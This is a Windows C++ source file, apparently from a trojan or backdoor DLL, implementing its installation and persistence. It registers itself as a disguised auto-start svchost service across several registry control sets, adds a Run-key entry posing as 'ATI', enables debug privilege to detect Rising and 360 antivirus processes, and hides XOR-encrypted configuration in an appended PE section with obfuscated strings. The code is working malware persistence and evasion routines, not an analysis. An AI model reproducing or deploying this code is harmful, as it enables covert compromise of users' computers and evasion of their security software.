// MyMainFunc.cpp: implementation of the MyMainFunc class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

BOOL MakeService()
{
	//ע�����
	if(!InstallMyService())
	{
		return FALSE;
	}

	//�޸�������Ŀ
	ModifyService();

	//��������
	return StartMyService(m_DllInfo.m_ServiceName);
}

BOOL InstallMyService()
{
	SC_HANDLE mgr = NULL, srv = NULL;
	mgr = m_gFunc.OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(!mgr) 
	{
		return FALSE;
	}

	//\\svchost.exe -k 
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10206, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ȡDll�ļ�����
	char m_DesFilePath[MAX_PATH] = {0};
	m_gFunc.GetSystemDirectory(m_DesFilePath, 200);
	m_gFunc.strcat(m_DesFilePath, m_TmpStr);
	m_gFunc.strcat(m_DesFilePath, m_DllInfo.m_ServiceName);

	//������ǰ����
	srv = m_gFunc.CreateService(mgr, m_DllInfo.m_ServiceName,  m_DllInfo.m_ServiceView, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,      
		SERVICE_AUTO_START,  SERVICE_ERROR_NORMAL, m_DesFilePath, NULL, NULL, NULL, NULL, NULL);
	if(srv == NULL) 
	{
		m_gFunc.CloseServiceHandle(mgr);
		return FALSE;
	}

	SERVICE_DESCRIPTION m_Des = {0};
	m_Des.lpDescription = m_DllInfo.m_ServiceTitle;
	m_gFunc.ChangeServiceConfig2(srv, SERVICE_CONFIG_DESCRIPTION, &m_Des);
	m_gFunc.CloseServiceHandle(srv);
	m_gFunc.CloseServiceHandle(mgr);
	return (BOOL) srv;
}

void ModifyService()
{
	char m_ImagePathSrc[MAX_PATH] = {0};
	if(m_DllInfo.m_DirAddr == 0)
	{
		//%SystemRoot%\\System32
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10207, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.strcpy(m_ImagePathSrc, m_TmpStr);
	}
	else
	{
		//%ProgramFiles%\\Common Files\\Microsoft Shared
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10208, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.strcpy(m_ImagePathSrc, m_TmpStr);
	}

	char m_DllFilePath[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_DllFilePath, 255);
	char* pFind = m_gFunc.strrchr(m_DllFilePath, '\\');
	if(pFind != NULL)
	{
		m_gFunc.strcat(m_ImagePathSrc, pFind);
	}

	//SYSTEM�����и�б��
	char wcRoot[256] = {0};
	m_gFunc.GetMyString(10214, wcRoot, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//CurrentControlSet
	char wcCurPath[256] = {0};
	m_gFunc.GetMyString(10213, wcCurPath, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ControlSet001
	char wcS01Path[256] = {0};
	m_gFunc.GetMyString(10212, wcS01Path, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ControlSet002
	char wcS02Path[256] = {0};
	m_gFunc.GetMyString(10211, wcS02Path, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ControlSet003
	char wcS03Path[256] = {0};
	m_gFunc.GetMyString(10210, wcS03Path, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//\\Services�����и�б��
	char wcService[256] = {0};
	m_gFunc.GetMyString(10209, wcService, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//�޸�ע���
	char m_KeyPath[MAX_PATH] = {0};
	MyRegSetKeyGroup(m_DllInfo.m_ServiceName);

	//%s%s%s%s\\Parameters
	char m_tmpStr[256] = {0};
	m_gFunc.GetMyString(10215, m_tmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//%s%s%s%s
	char m_tmpStr1[256] = {0};
	m_gFunc.GetMyString(10216, m_tmpStr1, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//CurrentControlSet
	m_gFunc.sprintf(m_KeyPath, m_tmpStr, wcRoot, wcCurPath, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	m_gFunc.sprintf(m_KeyPath, m_tmpStr1, wcRoot, wcCurPath, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, m_DllInfo.m_ServiceTitle);
	
	//ControlSet001
	m_gFunc.sprintf(m_KeyPath, m_tmpStr, wcRoot, wcS01Path, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	m_gFunc.sprintf(m_KeyPath, m_tmpStr1, wcRoot, wcS01Path, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, m_DllInfo.m_ServiceTitle);

	//ControlSet002
	m_gFunc.sprintf(m_KeyPath, m_tmpStr, wcRoot, wcS02Path, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	m_gFunc.sprintf(m_KeyPath, m_tmpStr1, wcRoot, wcS02Path, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, m_DllInfo.m_ServiceTitle);

	//ControlSet003
	m_gFunc.sprintf(m_KeyPath, m_tmpStr, wcRoot, wcS03Path, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	m_gFunc.sprintf(m_KeyPath, m_tmpStr1, wcRoot, wcS03Path, wcService, m_DllInfo.m_ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, m_DllInfo.m_ServiceTitle);
}

BOOL StartMyService(char* pServiceName)
{
	//�򿪹����
	SC_HANDLE hMgr = m_gFunc.OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(hMgr == NULL) 
	{
		return FALSE;
	}

	//�������Ƿ����
	SC_HANDLE hSrv = m_gFunc.OpenService(hMgr, pServiceName, SERVICE_ALL_ACCESS);
	if(hSrv == NULL)
	{
		m_gFunc.CloseServiceHandle(hMgr);
		return FALSE;
	}

	BOOL ret = m_gFunc.StartService(hSrv, 0, NULL);

	//�ر����ݿ�
	m_gFunc.CloseServiceHandle(hSrv);
	m_gFunc.CloseServiceHandle(hMgr);
	return ret;
}

BOOL GetFileSaveInfoFromMoudle()
{
	BYTE* pModuel = (BYTE*) m_ghInstance;

	// PEͷƫ��
	DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
	
	// ȡ�� PE ͷ
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

	//ȡ�ִ���Դƫ����
	LPPSSAVEFILEINFO pSaveFileInfo = NULL;
	for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pModuel[i]) == PS_FIND_FLAG)
		{	
			pSaveFileInfo = (LPPSSAVEFILEINFO) &pModuel[i];
			break;
		}
	}
	if(pSaveFileInfo == NULL)
	{
		return FALSE;
	}

	//��ʼλ��
	BYTE* pTmpData = ((BYTE*) pSaveFileInfo) + sizeof(PSSAVEFILEINFO) + pSaveFileInfo->m_StringLen;
	
	//ԭʼ��Ϣ����
	BYTE* pSaveInfo = pTmpData + sizeof(PSDLLINFO);
	
	//��Կ
	BYTE* pKeyData = pTmpData;
	
	//ԭʼ����
	BYTE* pSrcData = (BYTE*) &m_DllInfo;
	m_gFunc.memcpy(pSrcData, pSaveInfo, sizeof(PSDLLINFO));

	//��ԭ����
	for(i = 0; i < sizeof(PSDLLINFO); i++)
	{
		pSrcData[i] = pSrcData[i] ^ pKeyData[i];
	}
	return TRUE;
}

void GetMoudleMame(DWORD pId, TCHAR* pExeName)
{
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	TCHAR m_ExeName[MAX_PATH] = {0};
	if(m_gFunc.GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		m_gFunc.strcpy(pExeName, m_ExeName);
	}
    m_gFunc.CloseHandle(hProcess);
}

void CheckKillSoft()
{
//	m_DllInfo.m_KillSoft = _KILL_360;
//	return;

	//SeDebugPrivilege
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10217, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ö�ٵ�ǰϵͳ�����б�
	HANDLE hToken = NULL;  
	TOKEN_PRIVILEGES tkp = {0};   
	m_gFunc.OpenProcessToken(m_gFunc.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	m_gFunc.LookupPrivilegeValue(NULL, m_TmpStr, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	m_gFunc.AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 
	DWORD dId[4096] = {0};
	DWORD nSize = 0;
	if(!m_gFunc.EnumProcesses(dId, sizeof(DWORD) * 4096, &nSize))
	{
		return;
	}

	//ravmond.exe
	char RavStr1[256] = {0};
	m_gFunc.GetMyString(10218, RavStr1, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//rstray.exe
	char RavStr2[256] = {0};
	m_gFunc.GetMyString(10219, RavStr2, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

#ifdef PS_VER_DINGZUO
	//360tray.exe
	char Kill360Str[256] = {0};
	m_gFunc.GetMyString(10220, Kill360Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
#endif
	
	//�鿴�����б�����ϵͳ�Ѿ���װ��ɱ�����
	for(DWORD i = 0; i < nSize / sizeof(DWORD); i++)
	{
		TCHAR m_EnumProcessName[256] = {0};
		GetMoudleMame(dId[i], m_EnumProcessName);
		m_gFunc.CharLower(m_EnumProcessName);
		if(m_gFunc.strstr(m_EnumProcessName, RavStr1) != NULL || m_gFunc.strstr(m_EnumProcessName, RavStr2) != NULL)
		{
			m_DllInfo.m_KillSoft = _KILL_RAV;
			break;
		}

#ifdef PS_VER_DINGZUO
		if(m_gFunc.strstr(m_EnumProcessName, Kill360Str) != NULL)
		{
			m_DllInfo.m_KillSoft = _KILL_360;
			break;
		}
#endif

	}
}

BOOL ReadMyFile(LPCTSTR m_FileName, BYTE** pFileData, DWORD* nFileLen)
{
	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	*nFileLen = m_gFunc.GetFileSize(hFile, NULL);
	if(*nFileLen <= 0)
	{
		m_gFunc.CloseHandle(hFile);
		return FALSE;
	}
	*pFileData = new BYTE[*nFileLen];
	m_gFunc.ReadFile(hFile, *pFileData, *nFileLen, &nReadLen, NULL);
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}

BOOL AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile)
{
	// PEͷƫ��
	DWORD dwPE_Header_OffSet = *(DWORD *)(pPeData + 0x3C);
	
	// ȡ�� PE ͷ
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pPeData + dwPE_Header_OffSet);
	
	// �ж��Ƿ���Ч��PE�ļ�
	if (pPE_Header->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	// �����½ڵ�ƫ�Ƶ�ַ
	DWORD dwMySectionOffSet = dwPE_Header_OffSet;
	dwMySectionOffSet += 4;		//sizeof("PE\0\0")
	dwMySectionOffSet += sizeof(IMAGE_FILE_HEADER);
	dwMySectionOffSet += sizeof(IMAGE_OPTIONAL_HEADER32);
	dwMySectionOffSet += pPE_Header->FileHeader.NumberOfSections * 0x28;	//NumberOfSections * sizeof(IMAGE_SECTION_HEADER)

	// ���PEͷ�Ŀռ乻������
	if(dwMySectionOffSet + 0x28 > pPE_Header->OptionalHeader.SizeOfHeaders)
	{
		// ��� PE ͷ�Ŀռ䲻���ʧ�ܣ�
		return FALSE;
	}

	// �½�
	IMAGE_SECTION_HEADER *pNewSec = (IMAGE_SECTION_HEADER *)(pPeData + dwMySectionOffSet);

	// ��ȡ�½�λ�ô������ݣ�������ȫ0
	for (int i = 0; i != 0x28; ++i)
	{
		BYTE bt = *((PBYTE)pNewSec + i);
		if (bt)
		{
			// ��0��˵������ռ��Ѿ�����ʲô�ӳټ���ռ����
			// ֻ��Ĩ��image_directory_entry_bound_im���ڳ��ռ䡣
			m_gFunc.memset(pPeData + dwPE_Header_OffSet + 0xD0, 0, 8);
			break;
		}
	}
	
	pNewSec->Misc.VirtualSize = DataLen;
	
	// �½ڵ�RVA
	pNewSec->VirtualAddress = pPE_Header->OptionalHeader.SizeOfImage;

	//SizeOfRawData��EXE�ļ����Ƕ��뵽FileAlignMent����������ֵ
	pNewSec->SizeOfRawData = DataLen;
	pNewSec->SizeOfRawData /= pPE_Header->OptionalHeader.FileAlignment;
	pNewSec->SizeOfRawData++;
	pNewSec->SizeOfRawData *= pPE_Header->OptionalHeader.FileAlignment;
	
	// �����½ڵ� PointerToRawData
	pNewSec->PointerToRawData = nPeLen;
	
	// �����½ڵ�����
	pNewSec->Characteristics = 0x40000040;		//�ɶ�,���ѳ�ʼ��

	// ����NumberOfSections
	pPE_Header->FileHeader.NumberOfSections++;

	// ����SizeOfImage
	pPE_Header->OptionalHeader.SizeOfImage += 
		(pNewSec->Misc.VirtualSize/pPE_Header->OptionalHeader.SectionAlignment + 1) * 
		pPE_Header->OptionalHeader.SectionAlignment;

	// ���浽�ļ�
	HANDLE hFile = m_gFunc.CreateFile(pPeFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	DWORD dw = 0;
	if (!m_gFunc.WriteFile(hFile, pPeData, nPeLen, &dw, NULL)) {
		m_gFunc.CloseHandle(hFile);
		return FALSE;
	}
	
	if(!m_gFunc.WriteFile(hFile, pSaveData, DataLen, &dw, NULL)) {
		m_gFunc.CloseHandle(hFile);
		return FALSE;
	}

	// ����N�õ�bug�㣺
	int extraLen = pNewSec->SizeOfRawData - DataLen;
	if (extraLen != 0) {
		BYTE * pExtra = new BYTE[extraLen];
		m_gFunc.memset(pExtra, 0, extraLen);
		if(!m_gFunc.WriteFile(hFile, pExtra, extraLen, &dw, NULL)) {
			delete [] pExtra;
			m_gFunc.CloseHandle(hFile);
			return FALSE;
		}
		delete [] pExtra;
	}
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}

void MyRegSetKeyServiceDll(char* pKeyName, char* Value)
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = m_gFunc.RegCreateKeyEx(HKEY_LOCAL_MACHINE,
								pKeyName,
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//ServiceDll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10221, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	char m_KeyValue[MAX_PATH] = {0};
	m_gFunc.strcpy(m_KeyValue, Value);
	DWORD len = m_gFunc.strlen(m_KeyValue) + 1;
	ret = m_gFunc.RegSetValueEx(m_key, m_TmpStr, 0, REG_EXPAND_SZ, (CONST BYTE *) m_KeyValue, len);
	m_gFunc.RegCloseKey(m_key);
}

void MyRegSetKeyStart(char* pKeyName, DWORD m_KeyValue)
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = m_gFunc.RegCreateKeyEx(HKEY_LOCAL_MACHINE, pKeyName, 0, NULL, REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&m_key,&m_Res);
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//Start
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10222, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	DWORD len = sizeof(DWORD);
	ret = m_gFunc.RegSetValueEx(m_key, m_TmpStr, 0, REG_DWORD, (CONST BYTE *) &m_KeyValue, len);
	m_gFunc.RegCloseKey(m_key);
}

void MyRegSetKeyDescription(char* pKeyName, LPCTSTR m_KeyValue)
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = m_gFunc.RegCreateKeyEx(HKEY_LOCAL_MACHINE,pKeyName,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&m_key,&m_Res);
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//Description
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10223, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	DWORD len = (m_gFunc.strlen(m_KeyValue) + 1) * sizeof(char);
	char sKeyValue[MAX_PATH] = {0};
	m_gFunc.strcpy(sKeyValue, m_KeyValue);
	ret = m_gFunc.RegSetValueEx(m_key, m_TmpStr, 0, REG_SZ, (CONST BYTE *) sKeyValue, len);
	m_gFunc.RegCloseKey(m_key);
}

void MyRegSetKeyGroup(LPCTSTR AppName)
{
	//SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10224, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = m_gFunc.RegCreateKeyEx(HKEY_LOCAL_MACHINE, m_TmpStr, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &m_key, &m_Res);
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}
	char m_App[MAX_PATH] = {0};
	m_gFunc.strcpy(m_App, AppName);
	DWORD len = m_gFunc.strlen(AppName) + 2;
	ret = m_gFunc.RegSetValueEx(m_key, AppName, 0, REG_MULTI_SZ, (CONST BYTE *) m_App, len);
	m_gFunc.RegCloseKey(m_key);
}

BOOL WriteMyFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, pData, nLen, &nWriteLen, NULL);
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}

BOOL CopyMyFileToDesDir(char* pDesFilePath)
{
	char m_ModuleName[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_ModuleName, 255);

	//�޸�DLL����
	BYTE* pDllFileData = NULL;
	DWORD nSrcDllDataLen = 0;
	if(!ReadMyFile(m_ModuleName, &pDllFileData, &nSrcDllDataLen))
	{
		return FALSE;
	}

	//�������ݵ�����DLL
	DWORD	nSaveLen = sizeof(PSSAVEFILEINFO) + m_gFunc.nZipStringLen + sizeof(PSDLLINFO) * 2;
	LPBYTE	pSaveData = new BYTE[nSaveLen];
	BYTE*	pCurPoint = pSaveData;

	PSSAVEFILEINFO m_SaveFileInfo = {0};
	
	//���������־
	m_SaveFileInfo.m_FindFlag = PS_FIND_FLAG;

	//�ִ����ݳ���
	m_SaveFileInfo.m_StringLen = m_gFunc.nZipStringLen;

	//�ṹ����
	m_SaveFileInfo.m_InfoLen = sizeof(PSDLLINFO);

	//��Ϣͷ
	m_gFunc.memcpy(pCurPoint, &m_SaveFileInfo, sizeof(PSSAVEFILEINFO));
	pCurPoint += sizeof(PSSAVEFILEINFO);
	
	//�ַ�����Դ
	m_gFunc.memcpy(pCurPoint, m_gFunc.pZipString, m_gFunc.nZipStringLen);
	pCurPoint += m_gFunc.nZipStringLen;

	//����������Ϣ
	LPBYTE pKeyData = pCurPoint;
	m_gFunc.srand((unsigned) m_gFunc.time(NULL));
	for(DWORD i = 0; i < sizeof(PSDLLINFO); i++)
	{
		pKeyData[i] = m_gFunc.rand();
	}
	pCurPoint += sizeof(PSDLLINFO);

	//�ṹ��Ϣ
	LPBYTE pSrcData = pCurPoint;
	m_gFunc.memcpy(pSrcData, &m_DllInfo, sizeof(PSDLLINFO));
	
	//��������
	for(i = 0; i < sizeof(PSDLLINFO); i++)
	{
		pSrcData[i] = pSrcData[i] ^ pKeyData[i];
	}

	//���浽DLL�ļ�
	AddDataToPe(pSaveData, nSaveLen, pDllFileData, nSrcDllDataLen, pDesFilePath);
	delete [] pSaveData;
	
	delete [] pDllFileData;
	return TRUE;
}

void MakeRavStartInfo(char* pDesPathName)
{
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
	char m_RegKeyStr[256] = {0};
	m_gFunc.GetMyString(10230, m_RegKeyStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = m_gFunc.RegCreateKeyEx(HKEY_LOCAL_MACHINE,m_RegKeyStr, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &m_key, &m_Res);
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//rundll32.exe \"%s\",ServiceMain
	char m_KeyValueStr[256] = {0};
	m_gFunc.GetMyString(10231, m_KeyValueStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_KeyValue[256] = {0};
	m_gFunc.sprintf(m_KeyValue, m_KeyValueStr, pDesPathName);

	//ATI
	char m_AtiStr[256] = {0};
	m_gFunc.GetMyString(10232, m_AtiStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	DWORD nValue = 0;
	ret = m_gFunc.RegSetValueEx(m_key, m_AtiStr, 0, REG_SZ, (BYTE*) m_KeyValue, m_gFunc.strlen(m_KeyValue));
	m_gFunc.RegCloseKey(m_key);
}
